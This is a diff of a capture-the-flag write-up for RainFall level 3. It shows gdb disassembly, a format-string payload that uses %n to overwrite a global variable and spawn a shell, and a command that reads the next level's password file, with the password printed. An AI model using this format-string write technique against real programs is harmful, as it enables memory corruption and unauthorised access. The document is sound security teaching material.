@@ -6,29 +6,39 @@
    ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             █▄▄▄▄██▀
     ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀              ▀▀▀▀▀
 
-This time, the program still reads stdin but in a protected manner (no more then 512 chars, the size of the buffer).
+This time, the program still reads stdin but in a protected manner (no more than 512 chars, the size of the buffer).
 But, it passes the raw input as format string to printf.
 To win, we just have to pass a cmp instruction:
-> 0x080484da <+54>:    mov    0x804988c,%eax
-> 0x080484df <+59>:    cmp    $0x40,%eax
-(gdb) info symbol 0x804988c
-> m in section .bss
 
-# First, figure out where the format string is in the stack
+(gdb) disas v
+(...)
+   0x080484da <+54>:    mov    0x804988c,%eax
+   0x080484df <+59>:    cmp    $0x40,%eax
+(...)
+(gdb) info symbol 0x804988c
+m in section .bss
+
+First, figure out where the format string is in the stack:
+
 level3@RainFall:~$ ./level3
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %p %p %p %p [...]
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 [...]
 -> The fourth argument onward is our string/buffer
+-> The input string is the first and also the fourth argument passed to printf !
 
-# Use printf to set m
+Then, use printf to set m:
+
 -> %n:  The number of characters written so far is stored into the integer indicated by the corresponding argument.
 The fmt string is as follow:
 - address of m (\x8c\x98\x04\x08)
 - 60 padding chars to print a total of 64 chars (%60d)
-- special argument to write the output len into the address of the 4th argument (%4$n)
+- special argument to write the output len (64) into the address at the 4th argument (m): %4$n
 
 echo -ne '\x8c\x98\x04\x08%60d%4$n\n' > /tmp/l3 && cat /tmp/l3 - | ./level3
 (things like '\x8c\x98\x04\x08%10p%10p%40p%n\n' also work, and the last '\n' is optional)
 
+level3@RainFall:~$ echo -ne '\x8c\x98\x04\x08%60d%4$n\n' > /tmp/l3 && cat /tmp/l3 - | ./level3
+                                                         512
+Wait what?!
 cat /home/user/level4/.pass
-> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
